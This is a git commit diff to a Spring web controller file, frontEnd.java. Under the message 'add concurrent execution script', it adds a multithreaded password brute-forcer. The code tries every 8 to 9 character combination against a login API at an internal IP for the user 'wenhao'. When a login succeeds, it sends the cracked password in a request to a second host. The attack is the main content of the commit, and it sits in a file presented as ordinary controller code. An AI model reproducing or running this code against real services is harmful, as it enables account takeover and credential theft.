6f0b2673339a48b8e23a9be001a147851847ef9c
wenhaoFreezoneX <yuwenhao@freezonex.io>
2023-12-14 14:56:28 +0800

    添加并发执行脚本

--- src/main/java/com/supos/app/controller/frontEnd.java
+++ src/main/java/com/supos/app/controller/frontEnd.java
@@ -1,9 +1,15 @@
 package com.supos.app.controller;
 
+import cn.hutool.http.HttpRequest;
+import cn.hutool.http.HttpResponse;
 import org.springframework.stereotype.Controller;
 import org.springframework.web.bind.annotation.*;
 import org.springframework.ui.Model;
 import org.springframework.beans.factory.annotation.Value;
+
+import java.util.ArrayList;
+import java.util.List;
+import java.util.concurrent.*;
 
 
 @Controller
@@ -42,5 +48,59 @@ public class frontEnd {
     public String view2(Model model) {
         return "fun.html";
     }
+
+    public static void main(String[] args) throws InterruptedException, ExecutionException {
+        int maxLength = 9;
+        int numThreads = Runtime.getRuntime().availableProcessors(); // 使用可用的处理器数量
+
+        ExecutorService executorService = Executors.newFixedThreadPool(numThreads);
+
+        for (int length = 8; length <= maxLength; length++) {
+            generateCombinationsConcurrently(length, executorService);
+        }
+
+        executorService.shutdown();
+    }
+
+    private static void generateCombinationsConcurrently(int length, ExecutorService executorService)
+            throws InterruptedException, ExecutionException {
+        String characters = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()-_=+[]{}|;:'\\\",.<>?/";
+        List<Future<Void>> futures = new ArrayList<>();
+
+        for (int i = 0; i < characters.length(); i++) {
+            char currentChar = characters.charAt(i);
+            String prefix = String.valueOf(currentChar);
+            Callable<Void> task = () -> {
+                System.out.println("Generating combinations for prefix: " + prefix);
+                generateCombinations(prefix, characters, length - 1);
+                return null;
+            };
+            futures.add(executorService.submit(task));
+        }
+
+        for (Future<Void> future : futures) {
+            future.get(); // 等待任务完成
+        }
+    }
+
+        private static void generateCombinations(String prefix, String characters, int remainingLength) {
+            if (remainingLength == 0) {
+                System.out.println(prefix);
+//                prefix="b00000U!";
+                String body ="{\"userName\":\"wenhao\",\"password\":\""+prefix+"\",\"clientId\":\"ms-content-sample\",\"userAgent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0\"}";
+                HttpResponse response = HttpRequest.post("http://192.168.31.223:8080/inter-api/auth/login").body(body).execute();
+                if (response.getStatus() == 200){
+                     HttpRequest.get("http://192.168.31.165:1880/hello?hello="+prefix).execute();
+                    System.out.println("成功");
+                }
+                return;
+            }
+
+            for (int i = 0; i < characters.length(); i++) {
+                char currentChar = characters.charAt(i);
+                generateCombinations(prefix + currentChar, characters, remainingLength - 1);
+            }
+        }
+
 
 }
